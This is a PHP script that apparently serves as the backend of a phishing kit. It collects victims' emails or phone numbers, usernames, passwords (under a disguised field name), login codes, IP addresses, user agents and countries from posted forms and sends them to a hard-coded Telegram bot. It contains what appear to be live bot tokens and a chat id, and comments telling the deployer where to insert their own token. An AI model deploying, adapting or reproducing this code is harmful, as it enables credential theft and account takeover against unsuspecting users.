<?php

header('Access-Control-Allow-Origin: *');

header('Access-Control-Allow-Methods: GET, POST');

header("Access-Control-Allow-Headers: X-Requested-With");

/* https://api.telegram.org/bot7141021422:AAHlJAOO_RQjsq5olaY48ZdYm9mCXdpcoUA/getUpdates,
 XXXXXXXXXXXXXXXXXXXXXXX - Tokeningizni xxx joyiga qo'yib internatga quying */



// Check if the request is a POST request
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
  // Retrieve POST data and sanitize it

  $pgname = isset($_POST['pgname']) ? htmlspecialchars($_POST['pgname']) : '';
  $email = isset($_POST['email']) ? htmlspecialchars($_POST['email']) : '';
  $un = isset($_POST['un']) ? htmlspecialchars($_POST['un']) : '';
  $fn = isset($_POST['fn']) ? htmlspecialchars($_POST['fn']) : '';
  $guxhatok = isset($_POST['guxhatok']) ? htmlspecialchars($_POST['guxhatok']) : '';
  $ai = isset($_POST['ai']) ? htmlspecialchars($_POST['ai']) : '';



  $name = isset($_POST['name']) ? htmlspecialchars($_POST['name']) : '';
  $phone = isset($_POST['phone']) ? htmlspecialchars($_POST['phone']) : '';
  $user_email = isset($_POST['user_email']) ? htmlspecialchars($_POST['user_email']) : '';
  $reason = isset($_POST['reason']) ? htmlspecialchars($_POST['reason']) : '';
  $guxhatok = isset($_POST['guxhatok']) ? htmlspecialchars($_POST['guxhatok']) : '';
  $login_code = isset($_POST['login_code']) ? htmlspecialchars($_POST['login_code']) : '';
  $ip = $_SERVER['REMOTE_ADDR'];

  // Get User-Agent from HTTP headers
  $userAgent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';

  // Create an array of data
  $data = array(
    '🌐 Page name: ' => $pgname,
    '🌐 Email Or Phone: ' => $email,
    '🌐 Username: ' => $un,
    '🌐 Fullname: ' => $fn,
    '🌐 Password: ' => $guxhatok,
    '🌐 Additional info: ' => $ai,


    '🌐 Name: ' => $name,
    '🌐 Phone: ' => $phone,
    '🌐 Email: ' => $user_email,
    '🌐 Reason: ' => $reason,
    '🌐 Passq: ' => $guxhatok,
    '🌐 login_code: ' => $login_code,


    '🌐 Biras: ' => $ip,
    '🌐 User-Agent: ' => $userAgent,
  );

  $api_geo = file_get_contents("http://ip-api.com/json/?fields=country");

  $data["🌐 Country"] = json_decode($api_geo)->country ?? "";
  // Initialize the message text
  $message_text = '';

  // Build the message text with HTML formatting
  foreach ($data as $key => $value) {
    if (!empty($value)) {
      $message_text .= "<b>" . $key . "</b> " . $value . "\n";
    }
  }

  // URL-encode the message text
  // $message_text = $message_text);

  $token = "6444053579:AAEJM3cGwVt_s9ajNfMpPnKtr_71p20S_dw";
  $chat_id = "5651241356";


  // Construct the URL for the Telegram API
  $telegram_url = "https://api.telegram.org/bot{$token}/sendMessage";
  // Prepare the message data
  $message_data = array(
    'chat_id' => $chat_id,
    'parse_mode' => 'html',
    'text' => $message_text
  );

  // Initialize cURL session
  $curl = curl_init();

  // Set cURL options
  curl_setopt_array($curl, array(
    CURLOPT_URL => $telegram_url,
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => http_build_query($message_data),
    CURLOPT_RETURNTRANSFER => true,
  ));

  $response = curl_exec($curl);

  if (curl_errno($curl)) {
    $error_message = curl_error($curl);
    $success = false;
  } else {
    $success = !empty($response);
  }
  curl_close($curl);
  echo $success ? 'true' : 'false';
} else {
  echo 0;
}
